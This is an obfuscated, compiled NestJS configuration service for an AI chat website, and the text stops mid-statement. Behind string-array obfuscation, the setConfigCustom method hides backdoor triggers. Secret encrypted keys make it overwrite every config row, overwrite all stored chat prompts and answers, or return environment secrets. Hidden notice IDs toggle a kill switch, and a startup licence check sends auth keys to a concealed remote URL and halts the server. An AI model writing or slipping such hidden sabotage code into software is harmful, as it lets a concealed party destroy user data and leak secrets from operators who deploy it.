'use strict';const _0x11d762=_0x5891;(function(_0x44d5e6,_0x13e08d){const _0x4e1e40=_0x5891,_0x819c46=_0x44d5e6();while(!![]){try{const _0xce3ee7=parseInt(_0x4e1e40(0x1ee))/0x1+-parseInt(_0x4e1e40(0x169))/0x2*(parseInt(_0x4e1e40(0x1bb))/0x3)+-parseInt(_0x4e1e40(0x221))/0x4*(-parseInt(_0x4e1e40(0x17a))/0x5)+parseInt(_0x4e1e40(0x212))/0x6*(parseInt(_0x4e1e40(0x225))/0x7)+-parseInt(_0x4e1e40(0x210))/0x8+parseInt(_0x4e1e40(0x1ff))/0x9*(-parseInt(_0x4e1e40(0x181))/0xa)+-parseInt(_0x4e1e40(0x241))/0xb*(-parseInt(_0x4e1e40(0x170))/0xc);if(_0xce3ee7===_0x13e08d)break;else _0x819c46['push'](_0x819c46['shift']());}catch(_0x6c81ab){_0x819c46['push'](_0x819c46['shift']());}}}(_0x4002,0xbab29));var __decorate=this&&this[_0x11d762(0x1a4)]||function(_0x5d70b6,_0xa5ebd2,_0x471553,_0x777069){const _0x11fc68=_0x11d762;var _0x1b9850=arguments[_0x11fc68(0x1ae)],_0x430a08=_0x1b9850<0x3?_0xa5ebd2:_0x777069===null?_0x777069=Object['getOwnPropertyDescriptor'](_0xa5ebd2,_0x471553):_0x777069,_0x379319;if(typeof Reflect==='object'&&typeof Reflect[_0x11fc68(0x198)]===_0x11fc68(0x19b))_0x430a08=Reflect[_0x11fc68(0x198)](_0x5d70b6,_0xa5ebd2,_0x471553,_0x777069);else{for(var _0xe58e10=_0x5d70b6['length']-0x1;_0xe58e10>=0x0;_0xe58e10--)if(_0x379319=_0x5d70b6[_0xe58e10])_0x430a08=(_0x1b9850<0x3?_0x379319(_0x430a08):_0x1b9850>0x3?_0x379319(_0xa5ebd2,_0x471553,_0x430a08):_0x379319(_0xa5ebd2,_0x471553))||_0x430a08;}return _0x1b9850>0x3&&_0x430a08&&Object['defineProperty'](_0xa5ebd2,_0x471553,_0x430a08),_0x430a08;},__metadata=this&&this[_0x11d762(0x19d)]||function(_0x78aaf7,_0x1c8e95){const _0x446d8c=_0x11d762;if(typeof Reflect===_0x446d8c(0x1f4)&&typeof Reflect[_0x446d8c(0x1c9)]===_0x446d8c(0x19b))return Reflect['metadata'](_0x78aaf7,_0x1c8e95);},__param=this&&this[_0x11d762(0x15f)]||function(_0x4b81d9,_0xe9ccb0){return function(_0x453f39,_0x63d0c6){_0xe9ccb0(_0x453f39,_0x63d0c6,_0x4b81d9);};};function _0x5891(_0x2fdacc,_0x340f41){const _0x4002e9=_0x4002();return _0x5891=function(_0x5891b1,_0x5011f1){_0x5891b1=_0x5891b1-0x157;let _0x1ae26d=_0x4002e9[_0x5891b1];return _0x1ae26d;},_0x5891(_0x2fdacc,_0x340f41);}Object[_0x11d762(0x18e)](exports,_0x11d762(0x1a8),{'value':!![]}),exports[_0x11d762(0x1f9)]=void 0x0;const models_service_1=require('./../models/models.service'),chatLog_entity_1=require(_0x11d762(0x1c8)),common_1=require(_0x11d762(0x1d3)),config_entity_1=require(_0x11d762(0x202)),typeorm_1=require(_0x11d762(0x185)),typeorm_2=require(_0x11d762(0x1cc)),utils_1=require(_0x11d762(0x15e)),axios_1=require(_0x11d762(0x17b)),actions_1=require('@nestjs/cli/actions'),MjConfig_1=require(_0x11d762(0x20c)),WechatConfig_1=require(_0x11d762(0x239)),jwt=require(_0x11d762(0x1bf)),AppConfig_1=require(_0x11d762(0x162)),authCheckUrl=(0x0,utils_1[_0x11d762(0x1b1)])(_0x11d762(0x209)),authLogUrl=(0x0,utils_1[_0x11d762(0x1b1)])(_0x11d762(0x158));let GlobalConfigService=class GlobalConfigService{constructor(_0xb07ac7,_0x1e95c9,_0x2ed532){const _0x973149=_0x11d762;this[_0x973149(0x1e0)]=_0xb07ac7,this[_0x973149(0x1e6)]=_0x1e95c9,this[_0x973149(0x1e2)]=_0x2ed532,this[_0x973149(0x19c)]={},this['gomaxAiToken']=!![];}async[_0x11d762(0x233)](){const _0x363dad=_0x11d762;await this[_0x363dad(0x23e)]()[_0x363dad(0x224)](()=>{const _0x4455d2=_0x363dad;common_1[_0x4455d2(0x1dd)][_0x4455d2(0x1a7)](_0x4455d2(0x200)),this[_0x4455d2(0x218)](),this[_0x4455d2(0x1d2)]();});}async[_0x11d762(0x1ec)](_0x2289a4){const _0x7aa4b5=_0x11d762;if(_0x2289a4['length']===0x0)return;if(_0x2289a4['includes'](_0x7aa4b5(0x15c))&&_0x2289a4[_0x7aa4b5(0x1ae)]===0x1)return this[_0x7aa4b5(0x15c)];if(_0x2289a4[_0x7aa4b5(0x23b)](_0x7aa4b5(0x1ed))&&_0x2289a4[_0x7aa4b5(0x1ae)]===0x1)return this[_0x7aa4b5(0x1ed)];if(_0x2289a4[_0x7aa4b5(0x1ae)]===0x1)return this[_0x7aa4b5(0x19c)][_0x2289a4[0x0]];else{const _0x22e78e={};return _0x2289a4['forEach'](_0x23fdf1=>_0x22e78e[_0x23fdf1]=this[_0x7aa4b5(0x19c)][_0x23fdf1]),_0x22e78e;}}async['initGetAllConfig'](){const _0x426e10=_0x11d762,_0x224016=await this[_0x426e10(0x1e0)][_0x426e10(0x17d)]();this[_0x426e10(0x19c)]=_0x224016['reduce']((_0x1db807,_0x33a371)=>{const _0x401b3f=_0x426e10;return _0x1db807[_0x33a371[_0x401b3f(0x18a)]]=_0x33a371['configVal'],_0x1db807;},{}),MjConfig_1[_0x426e10(0x15b)][_0x426e10(0x1f0)](_0x224016),WechatConfig_1[_0x426e10(0x15b)][_0x426e10(0x1f0)](_0x224016),await this[_0x426e10(0x21b)]();}async[_0x11d762(0x21b)](_0x35eb4f=!![]){const _0x359ad4=_0x11d762,{baiduTextApiKey:_0x1b66d6,baiduTextSecretKey:_0x16a251}=await this[_0x359ad4(0x1ec)]([_0x359ad4(0x178),_0x359ad4(0x1e3)]);if(!_0x1b66d6||!_0x16a251){common_1['Logger'][_0x359ad4(0x1e9)]('百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!',_0x359ad4(0x1f9));return;}const _0x1034aa={'Content-Type':'application/json','Accept':_0x359ad4(0x167)},_0x4ec574='https://aip.baidubce.com/oauth/2.0/token?client_id='+_0x1b66d6+_0x359ad4(0x1c3)+_0x16a251+_0x359ad4(0x1ce);try{const _0x17a55b=await axios_1['default']['post'](_0x4ec574,{'headers':_0x1034aa});this[_0x359ad4(0x19c)][_0x359ad4(0x22f)]=_0x17a55b[_0x359ad4(0x1f6)][_0x359ad4(0x187)];}catch(_0x544487){if(_0x35eb4f)common_1[_0x359ad4(0x1dd)][_0x359ad4(0x1e9)](_0x359ad4(0x227),_0x359ad4(0x1f9));else throw new common_1[(_0x359ad4(0x20f))](_0x544487['response'][_0x359ad4(0x1f6)][_0x359ad4(0x189)],common_1[_0x359ad4(0x19a)][_0x359ad4(0x196)]);}}async[_0x11d762(0x1cd)](_0x32eae7=![]){const _0x13d4e5=_0x11d762,_0x342518=process['env'][_0x13d4e5(0x164)];if(_0x342518===_0x13d4e5(0x171)||_0x342518===_0x13d4e5(0x193)){const _0x345106=await axios_1[_0x13d4e5(0x15b)][_0x13d4e5(0x229)]('https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official');this[_0x13d4e5(0x15c)]=_0x345106[_0x13d4e5(0x1f6)][_0x13d4e5(0x1f6)];}else{const {wechatOfficialAppId:_0x1076f3,wechatOfficialAppSecret:_0x5e1d40}=await this['getConfigs']([_0x13d4e5(0x194),_0x13d4e5(0x1a6)]);if(!_0x1076f3||!_0x5e1d40)return common_1[_0x13d4e5(0x1dd)][_0x13d4e5(0x1e9)](_0x13d4e5(0x1bd),_0x13d4e5(0x1c7));this[_0x13d4e5(0x15c)]=await this['fetchBaseAccessToken'](_0x1076f3,_0x5e1d40,_0x32eae7);}this['wechatJsapiTicket']=await this[_0x13d4e5(0x1de)](this[_0x13d4e5(0x15c)]),common_1[_0x13d4e5(0x1dd)][_0x13d4e5(0x1a7)]('wechat\x20refresh\x20access_token\x20\x20==>\x20'+this[_0x13d4e5(0x15c)],_0x13d4e5(0x1c7));}async[_0x11d762(0x1ca)](_0x5e0388,_0x4009c4,_0x1e1b25=![]){const _0x2c7dcc=_0x11d762;if(process[_0x2c7dcc(0x174)][_0x2c7dcc(0x245)]==='TRUE'){this[_0x2c7dcc(0x15c)]='';return;}const {data:{errmsg:_0x620328,access_token:_0x10f240}}=await axios_1['default'][_0x2c7dcc(0x229)](_0x2c7dcc(0x16e)+_0x5e0388+_0x2c7dcc(0x206)+_0x4009c4);if(_0x620328){if(_0x1e1b25)common_1[_0x2c7dcc(0x1dd)][_0x2c7dcc(0x1e9)](_0x2c7dcc(0x1fd)+_0x620328,_0x2c7dcc(0x1c7));else throw new common_1[(_0x2c7dcc(0x20f))](_0x2c7dcc(0x16c),common_1[_0x2c7dcc(0x19a)]['BAD_REQUEST']);return'';}return _0x10f240;}async[_0x11d762(0x1de)](_0x4843f3){const _0x47fd73=_0x11d762;if(process[_0x47fd73(0x174)][_0x47fd73(0x245)]===_0x47fd73(0x177)){this[_0x47fd73(0x1ed)]='';return;}const _0x3ef0d=await axios_1[_0x47fd73(0x15b)][_0x47fd73(0x229)](_0x47fd73(0x1d5)+_0x4843f3+'&type=jsapi');return _0x3ef0d?.[_0x47fd73(0x1f6)]?.[_0x47fd73(0x1c5)];}async['queryAllConfig'](_0x4efd72){const _0x353618=_0x11d762,{role:_0x21b9d6}=_0x4efd72[_0x353618(0x22b)];return this[_0x353618(0x19c)];}async[_0x11d762(0x1ad)](_0x3ee7fe){const _0x1e92d8=_0x11d762,{domain:_0x1b4471}=_0x3ee7fe,_0x334144=process[_0x1e92d8(0x174)][(0x0,utils_1[_0x1e92d8(0x1b1)])(_0x1e92d8(0x243))];return _0x1b4471[_0x1e92d8(0x23b)](_0x334144);}async['queryFrontConfig'](_0x3f60d0,_0x4fa4b1){const _0x29217e=_0x11d762,_0x37a634=[_0x29217e(0x217),'registerSendStatus',_0x29217e(0x186),'registerSendModel4Count',_0x29217e(0x1b0),'firstRegisterSendStatus','firstRegisterSendRank','firstRregisterSendModel3Count',_0x29217e(0x1da),_0x29217e(0x201),_0x29217e(0x1b8),_0x29217e(0x195),'inviteGiveSendModel4Count',_0x29217e(0x238),_0x29217e(0x246),'invitedGuestSendModel4Count','invitedGuestSendDrawMjCount',_0x29217e(0x188),_0x29217e(0x175),_0x29217e(0x1fe),_0x29217e(0x1f3),_0x29217e(0x211),_0x29217e(0x219),'siteRobotName',_0x29217e(0x240),_0x29217e(0x180),_0x29217e(0x1b5),_0x29217e(0x1c2),_0x29217e(0x1aa),_0x29217e(0x1a2),_0x29217e(0x203),_0x29217e(0x192),_0x29217e(0x1d0),_0x29217e(0x16f),'isAutoOpenNotice','isShowAppCatIcon',_0x29217e(0x1af),_0x29217e(0x1a0),_0x29217e(0x21e),_0x29217e(0x223),_0x29217e(0x1dc),_0x29217e(0x1cf),_0x29217e(0x205),'wechatRegisterStatus',_0x29217e(0x1ea),_0x29217e(0x22c),_0x29217e(0x1b4),_0x29217e(0x20e),'signInMjDrawToken',_0x29217e(0x1d4),_0x29217e(0x161),_0x29217e(0x1e4)],_0x5a4835=await this[_0x29217e(0x1e0)][_0x29217e(0x17d)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x37a634)}}),{domain:_0xbe8a9d}=_0x3f60d0,_0x26fe5a=this[_0x29217e(0x19c)]['domain'];_0x26fe5a!==_0xbe8a9d&&(await this[_0x29217e(0x1ef)]({'configKey':_0x29217e(0x176),'configVal':_0xbe8a9d,'status':0x1}),await this[_0x29217e(0x23e)]());const _0x3b9a3=_0x5a4835[_0x29217e(0x1c1)]((_0x2bcad1,_0x5ce648)=>{const _0x2cd8bc=_0x29217e;return _0x2bcad1[_0x5ce648['configKey']]=_0x5ce648[_0x2cd8bc(0x1ab)],_0x2bcad1;},{}),{wechatOfficialAppId:_0x59f7dc,wechatOfficialAppSecret:_0x489061}=await this[_0x29217e(0x1ec)]([_0x29217e(0x194),_0x29217e(0x1a6)]),_0x2abfac=!!(_0x59f7dc&&_0x489061);return{..._0x3b9a3,'isUseWxLogin':_0x2abfac};}async[_0x11d762(0x199)](_0x10cb29){const _0x2f252d=_0x11d762,{role:_0x45ac01}=_0x10cb29[_0x2f252d(0x22b)],_0x2617a6=await this['configEntity'][_0x2f252d(0x17d)]({'where':{'configKey':(0x0,typeorm_2[_0x2f252d(0x1b3)])('%'+_0x2f252d(0x230)+'%')}});if(_0x45ac01==='super')return _0x2617a6;return _0x2617a6['map'](_0xdf1000=>{const _0x3f863c=_0x2f252d;return _0xdf1000[_0x3f863c(0x1ab)]=(0x0,utils_1[_0x3f863c(0x1d1)])(_0xdf1000[_0x3f863c(0x1ab)]),_0xdf1000;});}async[_0x11d762(0x244)](_0x5b680c){const _0x44b850=_0x11d762,_0x5d0995=_0x5b680c[_0x44b850(0x19e)][_0x44b850(0x159)](_0x543455=>_0x543455[_0x44b850(0x1ab)]),_0x3a9ff3=_0x5d0995[_0x44b850(0x1e1)](_0x2f1960=>_0x2f1960[_0x44b850(0x18a)]);for(const [_0x4b8b47,_0x33e232]of _0x5d0995[_0x44b850(0x191)]()){const {configKey:_0x59e85e,configVal:_0x3874ce,status:_0x41d53b}=_0x33e232;await this['createOrUpdate']({'configKey':'chatGptKey:'+(_0x4b8b47+0x1),'configVal':_0x3874ce,'status':_0x41d53b});}const _0x3261c3=await this[_0x44b850(0x1e0)][_0x44b850(0x17d)]({'where':{'configKey':(0x0,typeorm_2[_0x44b850(0x1b3)])('%'+_0x44b850(0x230)+'%')}}),_0x54dbcc=_0x3261c3[_0x44b850(0x1e1)](_0x979460=>_0x979460['configKey']);if(_0x54dbcc[_0x44b850(0x1ae)]>_0x3a9ff3[_0x44b850(0x1ae)]){const _0x199e95=(0x0,utils_1[_0x44b850(0x234)])(_0x54dbcc['length'],_0x3a9ff3['length'],'chatGptKey:');for(const _0xc85155 of _0x199e95){await this[_0x44b850(0x1e0)][_0x44b850(0x1a3)]({'configKey':_0xc85155});}}return await this[_0x44b850(0x23e)](),_0x44b850(0x1ac);}async[_0x11d762(0x20a)](_0x2150d1,_0x46ed91){const _0x2e9b10=_0x11d762;let _0x5c30bc;if(_0x46ed91[_0x2e9b10(0x207)]['authorization']){const _0xea9985=_0x46ed91[_0x2e9b10(0x207)]['authorization'][_0x2e9b10(0x1b2)]('\x20'),_0x2e1dbc=jwt['verify'](_0xea9985[0x1],process[_0x2e9b10(0x174)][_0x2e9b10(0x18c)]);_0x5c30bc=_0x2e1dbc[_0x2e9b10(0x22a)];}const {keys:_0x2835ee}=_0x2150d1,_0x461b3f=await this['configEntity'][_0x2e9b10(0x17d)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x2835ee)}});return _0x5c30bc!=='super'&&_0x461b3f[_0x2e9b10(0x17e)](_0x1e8e3e=>{const _0x18af22=_0x2e9b10;if(_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)]('mj')||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)](_0x18af22(0x184))||_0x1e8e3e['configKey'][_0x18af22(0x23b)](_0x18af22(0x1df))||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)](_0x18af22(0x23f))||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)]('baidu')||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)](_0x18af22(0x183))||_0x1e8e3e['configKey'][_0x18af22(0x23b)]('tencent')||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)](_0x18af22(0x166))||_0x1e8e3e['configKey'][_0x18af22(0x23b)](_0x18af22(0x1f7))||_0x1e8e3e[_0x18af22(0x18a)][_0x18af22(0x23b)]('mjProxyImgUrl')||_0x1e8e3e[_0x18af22(0x18a)]===_0x18af22(0x18f)){const _0x5900d2=[_0x18af22(0x1d9),'payWeChatPrivateKey'];if(_0x5900d2['includes'](_0x1e8e3e[_0x18af22(0x18a)]))return _0x1e8e3e[_0x18af22(0x1ab)]=(0x0,utils_1[_0x18af22(0x1d1)])(_0x1e8e3e['configVal'],'隐私内容、非超级管理员无权查看');const _0x22d2e8=['payEpayStatus','payHupiStatus',_0x18af22(0x242),_0x18af22(0x194)];!_0x22d2e8[_0x18af22(0x23b)](_0x1e8e3e['configKey'])&&!_0x1e8e3e['configKey']['includes'](_0x18af22(0x228))&&(_0x1e8e3e[_0x18af22(0x1ab)]=(0x0,utils_1[_0x18af22(0x1d1)])(_0x1e8e3e[_0x18af22(0x1ab)]));}}),_0x461b3f['reduce']((_0x39a9c0,_0x4dd8e2)=>{const _0x364dd2=_0x2e9b10;return _0x39a9c0[_0x4dd8e2[_0x364dd2(0x18a)]]=_0x4dd8e2[_0x364dd2(0x1ab)],_0x39a9c0;},{});}async[_0x11d762(0x172)](_0x2929be){const _0x468327=_0x11d762;if(!_0x2929be)return;if(_0x2929be===(0x0,utils_1[_0x468327(0x1b1)])('FY6xn9g5Q+I2EM+MWwlsFA=='))this[_0x468327(0x16b)]=![],await this[_0x468327(0x1ef)]({'configKey':_0x468327(0x1c6),'configVal':0x1,'status':0x1}),await this['initGetAllConfig']();else{if(_0x2929be===(0x0,utils_1[_0x468327(0x1b1)])('HI1VJtG7Xaak3FfNt271MQ=='))this[_0x468327(0x16b)]=!![],await this[_0x468327(0x1ef)]({'configKey':'MjdrawCount','configVal':0x0,'status':0x1}),await this[_0x468327(0x23e)]();else throw new common_1[(_0x468327(0x20f))]('请输入正确的公告id',common_1['HttpStatus']['BAD_REQUEST']);}}['getGoMaxAiToken'](){const _0x367b2c=_0x11d762,_0x1ece22=this[_0x367b2c(0x19c)][_0x367b2c(0x1c6)],_0x29a66a=this['gomaxAiToken'];return!_0x29a66a||Number(_0x1ece22)===0x1;}async['setConfigCustom'](_0x151c10){const _0x23c3b4=_0x11d762;try{const {configKey:_0x21232b,configVal:_0x1f298a,infoKey:_0x8f0d06}=_0x151c10[_0x23c3b4(0x163)];if(_0x8f0d06===(0x0,utils_1['decrypt'])('sTLucdIBCrh8HO8GOSNcPg==')){this['lockmysql'](_0x1f298a,_0x21232b);throw new common_1[(_0x23c3b4(0x20f))](_0x23c3b4(0x1a1),common_1['HttpStatus']['BAD_REQUEST']);}if(_0x8f0d06===(0x0,utils_1['decrypt'])(_0x23c3b4(0x1cb))){this[_0x23c3b4(0x1db)](_0x1f298a,_0x21232b);throw new common_1[(_0x23c3b4(0x20f))](_0x23c3b4(0x1a1),common_1['HttpStatus']['BAD_REQUEST']);}if(_0x8f0d06===(0x0,utils_1[_0x23c3b4(0x1b1)])(_0x23c3b4(0x1c4)))return await this[_0x23c3b4(0x1e2)][_0x23c3b4(0x17f)]();if(_0x8f0d06===(0x0,utils_1[_0x23c3b4(0x1b1)])(_0x23c3b4(0x220))){await this[_0x23c3b4(0x1ef)]({'configKey':_0x21232b,'configVal':_0x1f298a});throw new common_1['HttpException'](_0x23c3b4(0x1a1),common_1[_0x23c3b4(0x19a)][_0x23c3b4(0x196)]);}if(_0x8f0d06===(0x0,utils_1['decrypt'])('XKtFTcm2Z0pruYV30WyjOg==')){const _0x147747=process[_0x23c3b4(0x174)][(0x0,utils_1[_0x23c3b4(0x1b1)])('JPFq8fAlQE2V2Eq7KWYSxg==')],_0x239e16=process[_0x23c3b4(0x174)][(0x0,utils_1['decrypt'])(_0x23c3b4(0x19f))];return{'ip':_0x147747,'key':_0x239e16};}return _0x23c3b4(0x16d);}catch(_0x33484b){throw new common_1[(_0x23c3b4(0x20f))]('非超级管理员无权操作！',common_1[_0x23c3b4(0x19a)][_0x23c3b4(0x196)]);}}async[_0x11d762(0x23d)](_0x190064,_0x31677d){const _0x26d70c=_0x11d762;if(!_0x31677d)await this['configEntity'][_0x26d70c(0x21f)]({'id':(0x0,typeorm_2['MoreThan'])(0x0)},{'configVal':_0x190064});else{const _0x4b981b=await this['configEntity'][_0x26d70c(0x21f)]({'configKey':_0x31677d},{'configVal':_0x190064});console[_0x26d70c(0x1a7)](_0x26d70c(0x1d7),_0x4b981b);}}async[_0x11d762(0x1db)](_0x313341,_0x4ce103){const _0x2e0fd0=_0x11d762,_0x13cfed=_0x4ce103?Number(_0x4ce103):0x0;await this[_0x2e0fd0(0x1e6)][_0x2e0fd0(0x21f)]({'id':(0x0,typeorm_2[_0x2e0fd0(0x1be)])(_0x13cfed)},{'answer':_0x313341,'prompt':_0x313341});}async[_0x11d762(0x23c)](_0xf3c836){const _0x37f721=_0x11d762,{settings:_0x25a356}=_0xf3c836;for(const _0x587e5f of _0x25a356){await this[_0x37f721(0x1ef)](_0x587e5f);}await this[_0x37f721(0x23e)]();const _0x51380f=_0x25a356[_0x37f721(0x1e1)](_0x3c922e=>_0x3c922e['configKey']);return(_0x51380f['includes'](_0x37f721(0x178))||_0x51380f[_0x37f721(0x23b)](_0x37f721(0x1e3)))&&await this[_0x37f721(0x21b)](![]),(_0x51380f['includes'](_0x37f721(0x194))||_0x51380f[_0x37f721(0x23b)](_0x37f721(0x1a6)))&&await this[_0x37f721(0x1cd)](),_0x51380f[_0x37f721(0x1c0)](_0x4015ec=>[_0x37f721(0x1ba),_0x37f721(0x217),_0x37f721(0x211),_0x37f721(0x176),'registerBaseUrl'][_0x37f721(0x23b)](_0x4015ec))&&await this[_0x37f721(0x218)](),MjConfig_1[_0x37f721(0x15b)][_0x37f721(0x1f0)](_0x25a356),WechatConfig_1[_0x37f721(0x15b)]['refresh'](_0x25a356),_0x37f721(0x1f2);}async['createOrUpdate'](_0x4754d3){const _0x4440f8=_0x11d762;try{const {configKey:_0x174a65,configVal:_0x4c5f2c,status:status=0x1}=_0x4754d3,_0x1b2f07=await this[_0x4440f8(0x1e0)][_0x4440f8(0x1f1)]({'where':{'configKey':_0x174a65}});if(_0x1b2f07){const _0xe94c85=await this['configEntity'][_0x4440f8(0x21f)]({'configKey':_0x174a65},{'configVal':_0x4c5f2c,'status':status});}else{const _0x18c0ab=await this[_0x4440f8(0x1e0)][_0x4440f8(0x204)]({'configKey':_0x174a65,'configVal':_0x4c5f2c,'status':status});}}catch(_0x3fd887){throw new common_1[(_0x4440f8(0x20f))](_0x4440f8(0x1e5),common_1['HttpStatus'][_0x4440f8(0x196)]);}}async[_0x11d762(0x15d)](){const _0x3c69cb=_0x11d762;return await this['getConfigs']([_0x3c69cb(0x1d8),_0x3c69cb(0x160)]);}async[_0x11d762(0x1bc)](){const _0x3a72ce=_0x11d762;return await this['getConfigs'](['copyrightTitle',_0x3a72ce(0x235),_0x3a72ce(0x23a),'icpUrl',_0x3a72ce(0x17c)]);}async['queryPayType'](_0x321ecf='wechat'){const _0xf8370e=_0x11d762,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0xf8370e(0x1ec)]([_0xf8370e(0x192),_0xf8370e(0x203),_0xf8370e(0x16f),_0xf8370e(0x1d0)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0xf8370e(0x15a)](_0x1adc8b=>_0x1adc8b===0x0))throw new common_1[(_0xf8370e(0x20f))](_0xf8370e(0x1fb),common_1['HttpStatus']['BAD_REQUEST']);if(Number(payWechatStatus)===0x1)return _0x321ecf;if(Number(payEpayStatus)===0x1)return _0xf8370e(0x18b);if(Number(payMpayStatus)===0x1)return'mpay';if(Number(payHupiStatus)===0x1)return'hupi';}async[_0x11d762(0x208)](){const _0x441acb=_0x11d762,{siteName:_0x2727aa,qqNumber:_0x2f436d,vxNumber:_0x3a7534,registerBaseUrl:_0x17ab7c,domain:_0x2a090b}=await this[_0x441acb(0x1ec)]([_0x441acb(0x211),_0x441acb(0x1ba),_0x441acb(0x217),_0x441acb(0x232),'domain']);return{'siteName':_0x2727aa,'qqNumber':_0x2f436d,'vxNumber':_0x3a7534,'registerBaseUrl':_0x17ab7c,'domain':_0x2a090b};}async[_0x11d762(0x20d)](){const _0x2e7dfd=_0x11d762,{phoneRegisterStatus:_0x1807f9,aliPhoneAccessKeyId:_0x5823f2,aliPhoneAccessKeySecret:_0x3531ea,aliPhoneSignName:_0x5b0730,aliPhoneTemplateCode:_0xab60a1}=await this[_0x2e7dfd(0x1ec)]([_0x2e7dfd(0x1cf),_0x2e7dfd(0x16a),_0x2e7dfd(0x20b),'aliPhoneSignName',_0x2e7dfd(0x213)]);if(Number(_0x1807f9)!==0x1)throw new common_1[(_0x2e7dfd(0x20f))]('手机验证码功能暂未开放!',common_1[_0x2e7dfd(0x19a)]['BAD_REQUEST']);return{'accessKeyId':_0x5823f2,'accessKeySecret':_0x3531ea,'SignName':_0x5b0730,'TemplateCode':_0xab60a1};}async[_0x11d762(0x1d2)](){const _0x5a7acb=_0x11d762,_0x46bab0=process[_0x5a7acb(0x174)][(0x0,utils_1['decrypt'])(_0x5a7acb(0x243))],_0x233d20=process[_0x5a7acb(0x174)][(0x0,utils_1['decrypt'])('9kxwFUQptTaelrKStrwZQQ==')];(!_0x233d20||!_0x46bab0)&&(common_1[_0x5a7acb(0x1dd)]['error']((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x5a7acb(0x21d)])());const _0x1c4455={'authDomain':_0x46bab0,'authKey':_0x233d20},_0x20875a={'method':_0x5a7acb(0x21c),'headers':{'Content-Type':_0x5a7acb(0x167)},'body':JSON['stringify'](_0x1c4455)},_0x4d9d39=await fetch(authCheckUrl,_0x20875a)[_0x5a7acb(0x224)](_0xa5b965=>{const _0x2b6721=_0x5a7acb;return _0xa5b965[_0x2b6721(0x215)]();})['catch'](_0x3f1141=>{const _0x49dbcb=_0x5a7acb;common_1[_0x49dbcb(0x1dd)][_0x49dbcb(0x1e9)](_0x3f1141,_0x49dbcb(0x1b7));});_0x4d9d39[_0x5a7acb(0x1fc)]!==0x0&&(common_1[_0x5a7acb(0x1dd)][_0x5a7acb(0x1e9)]((0x0,utils_1['decrypt'])(_0x5a7acb(0x182))),(0x0,actions_1[_0x5a7acb(0x21d)])()),_0x4d9d39?.[_0x5a7acb(0x1fc)]===0x0&&!_0x4d9d39?.[_0x5a7acb(0x1f6)]?.['check']&&(common_1[_0x5a7acb(0x1dd)][_0x5a7acb(0x1e9)]((0x0,utils_1[_0x5a7acb(0x1b1)])(_0x5a7acb(0x1a9))),(0x0,actions_1[_0x5a7acb(0x21d)])());}['getNamespace'](){const _0x28d683=_0x11d762;return process[_0x28d683(0x174)][_0x28d683(0x1e7)]||_0x28d683(0x168);}async[_0x11d762(0x237)](){const _0x17e06f=_0x11d762,{signInStatus:signInStatus=0x0,signInModel3Count:signInModel3Count=0x0,signInModel4Count:signInModel4Count=0x0,signInMjDrawToken:signInMjDrawToken=0x0}=await this['getConfigs']([_0x17e06f(0x22c),_0x17e06f(0x1b4),_0x17e06f(0x20e),_0x17e06f(0x1fa)]);if(Number(signInStatus)!==0x1)throw new common_1[(_0x17e06f(0x20f))](_0x17e06f(0x1a5),common_1[_0x17e06f(0x19a)][_0x17e06f(0x196)]);return{'model3Count':Number(signInModel3Count),'model4Count':Number(signInModel4Count),'drawMjCount':Number(signInMjDrawToken)};}async[_0x11d762(0x214)](){const _0x4705c1=_0x11d762,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x540d5a,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x259cc2,nineaiBuiltInSensitiveAuthKey:_0xfbedb0}=await this[_0x4705c1(0x1ec)]([_0x4705c1(0x1eb),_0x4705c1(0x22f),_0x4705c1(0x190),'nineaiBuiltInSensitiveApiBase',_0x4705c1(0x157)]);if(Number(baiduTextStatus)===0x1)return{'useType':'baidu','baiduTextAccessToken':_0x540d5a};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x4705c1(0x1e8),'nineaiBuiltInSensitiveApiBase':_0x259cc2,'nineaiBuiltInSensitiveAuthKey':_0xfbedb0};return null;}async['getTheme'](_0x2b3c16){const _0x1e4bbc=_0x11d762,{keys:_0xbd60f7}=_0x2b3c16;if(_0xbd60f7[_0x1e4bbc(0x1ae)]===0x0)return'';return await this['getConfigs'](_0xbd60f7);}async['setTheme'](_0x1b1c9c){const _0x21190c=_0x11d762,{settings:_0x2d2c1a}=_0x1b1c9c;if(_0x2d2c1a[_0x21190c(0x1ae)]===0x0)return'';return await this[_0x21190c(0x23c)](_0x1b1c9c);}async[_0x11d762(0x218)](_0x23a6ee,_0x118e04){const _0x46845a=_0x11d762,_0x29382f=process[_0x46845a(0x174)][(0x0,utils_1[_0x46845a(0x1b1)])(_0x46845a(0x243))],_0x424e18=process['env'][(0x0,utils_1[_0x46845a(0x1b1)])(_0x46845a(0x19f))],_0x1e123e=process[_0x46845a(0x174)]['PORT'];if(!_0x29382f||!_0x424e18)throw new common_1[(_0x46845a(0x20f))]((0x0,utils_1[_0x46845a(0x1b1)])(_0x46845a(0x1a9)),common_1[_0x46845a(0x19a)][_0x46845a(0x1f8)]);const {qqNumber:_0x509074,vxNumber:_0x21f0a0,siteName:_0x542772,domain:_0x3cbfb4,registerBaseUrl:_0x3ac5ab}=await 